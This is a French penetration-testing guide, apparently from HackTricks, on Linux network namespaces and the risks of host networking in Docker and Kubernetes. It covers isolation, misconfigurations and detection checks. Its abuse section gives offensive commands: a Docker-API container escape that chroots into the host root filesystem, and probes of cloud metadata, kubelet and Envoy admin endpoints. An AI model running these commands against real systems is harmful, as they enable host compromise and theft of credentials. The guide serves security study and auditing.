# Espace de noms réseau

{{#include ../../../../../banners/hacktricks-training.md}}

## Vue d'ensemble

L'espace de noms réseau isole les ressources liées au réseau, telles que les interfaces, les adresses IP, les tables de routage, l'état ARP/neighbor, les règles du firewall, les sockets, l'espace de noms abstrait des sockets de domaine UNIX, ainsi que le contenu de fichiers comme `/proc/net`.<sup>[[2]](#references)</sup> C'est pourquoi un container peut avoir ce qui ressemble à son propre `eth0`, ses propres routes locales et son propre périphérique loopback, sans posséder la véritable stack réseau de l'hôte.

Du point de vue de la sécurité, cela est important, car l'isolation réseau concerne bien plus que le binding de ports. Un espace de noms réseau privé limite ce que le workload peut observer ou reconfigurer directement. Dès que cet espace de noms est partagé avec l'hôte, le container peut soudainement obtenir une visibilité sur les listeners de l'hôte, les services locaux à l'hôte, les endpoints abstraits AF_UNIX et les points de contrôle réseau qui n'étaient jamais censés être exposés à l'application.

## Fonctionnement

Un espace de noms réseau fraîchement créé commence avec un environnement réseau vide ou presque vide jusqu'à ce que des interfaces y soient attachées. Les container runtimes créent ou connectent ensuite des interfaces virtuelles, attribuent des adresses et configurent les routes afin que le workload dispose de la connectivité attendue. Dans les déploiements basés sur un bridge, cela signifie généralement que le container voit une interface soutenue par une veth et connectée à un bridge de l'hôte. Dans Kubernetes, les plugins CNI prennent en charge la configuration équivalente pour le networking des Pods.

Cette architecture explique pourquoi `--network=host` ou `hostNetwork: true` constitue un changement aussi important. Au lieu de recevoir une stack réseau privée préparée, le workload rejoint celle réellement utilisée par l'hôte.

## Lab

Vous pouvez observer un espace de noms réseau presque vide avec :
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Et vous pouvez comparer les conteneurs normaux et ceux utilisant le réseau de l’hôte avec :
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Le container utilisant le réseau de l'hôte n'a plus sa propre vue isolée des sockets et des interfaces. Ce changement est déjà important en lui-même, avant même de s'interroger sur les capabilities dont dispose le processus.

## Utilisation à l'exécution

Docker et Podman créent normalement un network namespace privé pour chaque container, sauf configuration contraire. Kubernetes attribue généralement à chaque Pod son propre network namespace, partagé par les containers de ce Pod, mais séparé de celui de l'hôte. Cela signifie que `127.0.0.1` est généralement local au Pod plutôt que local au container : un listener lié uniquement à localhost dans un container est généralement accessible depuis ses sidecars et ses containers frères. Les systèmes Incus/LXC fournissent également une isolation riche basée sur les network namespaces, souvent avec une plus grande variété de configurations de réseaux virtuels.

Le principe général est que le réseau privé constitue la boundary d'isolation par défaut, tandis que le réseau de l'hôte est un opt-out explicite de cette boundary.

## Mauvaises configurations

La mauvaise configuration la plus importante consiste simplement à partager le network namespace de l'hôte. Cela se fait parfois pour des raisons de performance, de monitoring low-level ou de commodité, mais cela supprime l'une des boundaries les plus nettes disponibles pour les containers. Les listeners locaux à l'hôte deviennent accessibles de manière plus directe, les services accessibles uniquement via localhost peuvent devenir accessibles, et des capabilities telles que `CAP_NET_ADMIN` ou `CAP_NET_RAW` deviennent beaucoup plus dangereuses, car les opérations qu'elles permettent s'appliquent désormais à l'environnement réseau propre de l'hôte.

Un autre problème est l'attribution excessive de capabilities liées au réseau, même lorsque le network namespace est privé. Un namespace privé offre une protection, mais ne rend pas les raw sockets ou le contrôle réseau avancé inoffensifs.

Dans Kubernetes, `hostNetwork: true` modifie également le niveau de confiance que vous pouvez accorder à la segmentation réseau au niveau du Pod. Kubernetes indique que de nombreux plugins réseau ne peuvent pas correctement distinguer le trafic des Pods `hostNetwork` lors de la correspondance avec `podSelector` / `namespaceSelector`, et le traitent donc comme du trafic ordinaire du node.<sup>[[1]](#references)</sup> Du point de vue d'un attaquant, cela signifie qu'un workload `hostNetwork` compromis doit souvent être considéré comme un foothold réseau au niveau du node plutôt que comme un Pod normal toujours limité par les mêmes hypothèses de policy que les workloads du réseau overlay.

## Abus

Dans les configurations faiblement isolées, les attaquants peuvent inspecter les services en écoute sur l'hôte, atteindre les management endpoints liés uniquement à loopback, sniffer ou interférer avec le trafic selon les capabilities et l'environnement exacts, ou reconfigurer le routage et l'état du firewall si `CAP_NET_ADMIN` est présent. Dans un cluster, cela peut également faciliter le mouvement latéral et la reconnaissance du control plane.

Si vous suspectez l'utilisation du réseau de l'hôte, commencez par confirmer que les interfaces et les listeners visibles appartiennent à l'hôte plutôt qu'à un réseau de container isolé :
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Les services accessibles uniquement via loopback sont souvent la première découverte intéressante :
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Les sockets UNIX abstraites sont une autre cible facile à manquer, car elles sont limitées au network namespace, même si elles ne ressemblent pas à des listeners TCP/UDP et peuvent ne pas exister sous forme de chemins du système de fichiers dans `/run`. Un conteneur utilisant le réseau de l'hôte peut donc hériter de l'accès à des canaux de contrôle réservés à l'hôte, qui n'ont jamais été montés avec bind dans le conteneur :
```bash
ss -xap 2>/dev/null | head -n 50
grep -a '@' /proc/net/unix 2>/dev/null | head -n 50
```
Un exemple historique était le bug d’exposition du socket abstrait `containerd-shim`, mais la leçon générale est plus importante que le CVE spécifique : dès qu’une charge de travail rejoint le namespace réseau de l’hôte, les services AF_UNIX abstraits font également partie de la surface d’attaque.<sup>[[3]](#references)</sup> Si ces sockets semblent liés au runtime ou à l’administration, passez à [Exposition de l’API du runtime et du daemon](../../runtime-api-and-daemon-exposure.md).

Si des capabilities réseau sont présentes, testez si la charge de travail peut examiner ou modifier la pile visible :
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Sur les kernels modernes, le host networking associé à `CAP_NET_ADMIN` peut également exposer le chemin des paquets au-delà de simples modifications d’`iptables` / `nftables`. Les qdiscs et filtres `tc` sont eux aussi limités à un namespace, donc dans un namespace réseau partagé avec l’hôte, ils s’appliquent aux interfaces de l’hôte que le container peut voir. Si `CAP_BPF` est également présent, les programmes eBPF liés au réseau, tels que les loaders TC et XDP, deviennent également pertinents :<sup>[[4]](#references)</sup>
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Cela importe, car un attaquant peut être en mesure de dupliquer, rediriger, modeler ou abandonner le trafic au niveau de l’interface de l’hôte, et pas seulement de réécrire les règles du firewall. Dans un espace de noms réseau privé, ces actions sont limitées à la vue du container ; dans un espace de noms partagé avec l’hôte, elles ont un impact sur l’hôte.

Dans les environnements de cluster ou de cloud, le host networking justifie également une reconnaissance locale rapide des métadonnées et des services adjacents au control plane :
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
Dans Kubernetes, rappelez-vous que la compromission de **n’importe quel** container dans un Pod multi-container donne également accès aux listeners localhost ouverts par les containers frères et les sidecars, car l’ensemble du Pod partage un même network namespace. Cela devient particulièrement pertinent avec les service mesh, les containers d’observabilité et les containers d’assistance dont les interfaces d’administration ou de debug sont intentionnellement internes au Pod plutôt qu’accessibles à l’échelle du cluster :
```bash
ss -lntup | grep -E '127.0.0.1|::1'
curl -s http://127.0.0.1:15000/server_info 2>/dev/null | head
curl -s http://127.0.0.1:15000/config_dump 2>/dev/null | head
```
Considérez « bound to localhost » comme **Pod-private**, et non comme **container-private**. Après la compromission d’un container du Pod, cette hypothèse n’est plus valable.

### Exemple complet : Host Networking + Accès local au runtime / Kubelet

Le host networking ne fournit pas automatiquement les privilèges root sur l’hôte, mais il expose souvent des services qui sont intentionnellement accessibles uniquement depuis le node lui-même. Si l’un de ces services est faiblement protégé, le host networking devient un chemin direct d’escalade de privilèges.

Docker API sur localhost :
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet sur localhost :
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Impact :

- compromission directe de l’hôte si une API runtime locale est exposée sans protection adéquate
- reconnaissance du cluster ou mouvement latéral si le kubelet ou des agents locaux sont accessibles
- manipulation du trafic ou déni de service lorsqu’il est combiné avec `CAP_NET_ADMIN`

## Vérifications

L’objectif de ces vérifications est de déterminer si le processus dispose d’une pile réseau privée, quelles routes et quels listeners sont visibles, et si la vue du réseau ressemble déjà à celle de l’hôte avant même de tester les capabilities.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
ss -xap                      # UNIX sockets, including abstract namespace entries
grep -a '@' /proc/net/unix   # Quick view of abstract AF_UNIX sockets in this netns
```
Ce qui est intéressant ici :

- Si `/proc/self/ns/net` et `/proc/1/ns/net` semblent déjà similaires à ceux de l'hôte, le conteneur peut partager le network namespace de l'hôte ou un autre namespace non privé.
- `lsns -t net` et `ip netns identify` sont utiles lorsque le shell se trouve déjà à l'intérieur d'un namespace nommé ou persistant et que vous souhaitez le mettre en corrélation avec les objets de `/run/netns` depuis l'hôte.
- `ss -lntup` est particulièrement utile, car il révèle les listeners limités au loopback et les endpoints de gestion locaux. `ss -xap` et `/proc/net/unix` ajoutent la vue des abstract sockets que les recherches ordinaires de sockets dans le système de fichiers ne détectent pas.
- Les routes, les noms d'interfaces, le contexte du firewall, l'état de `tc` et les attachs eBPF deviennent beaucoup plus importants si `CAP_NET_ADMIN`, `CAP_NET_RAW` ou `CAP_BPF` est présent.
- Dans Kubernetes, l'échec de la résolution d'un nom de service depuis un Pod `hostNetwork` peut simplement signifier que le Pod n'utilise pas `dnsPolicy: ClusterFirstWithHostNet`, et non que le service est absent.
- Dans les Pods multi-conteneurs, les listeners localhost appartiennent à l'ensemble du network namespace du Pod. Vérifiez donc les sidecars et les conteneurs frères avant de supposer qu'un port limité au loopback est inaccessible depuis le conteneur compromis.

Lors de l'examen d'un conteneur, évaluez toujours le network namespace avec l'ensemble des capabilities. Le host networking associé à de fortes capabilities réseau correspond à une posture très différente du bridge networking associé à un ensemble restreint de capabilities par défaut.

## Références

- [1] [Kubernetes NetworkPolicy et réserves concernant `hostNetwork`](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [2] [`network_namespaces(7)` de Linux et isolation des abstract UNIX sockets](https://man7.org/linux/man-pages/man7/network_namespaces.7.html)
- [3] [Avis de sécurité containerd : abstract Unix domain sockets exposés aux conteneurs utilisant le host network](https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4)
- [4] [Exigences en tokens et capabilities eBPF pour les programmes eBPF liés au réseau](https://docs.ebpf.io/linux/concepts/token/)

{{#include ../../../../../banners/hacktricks-training.md}}
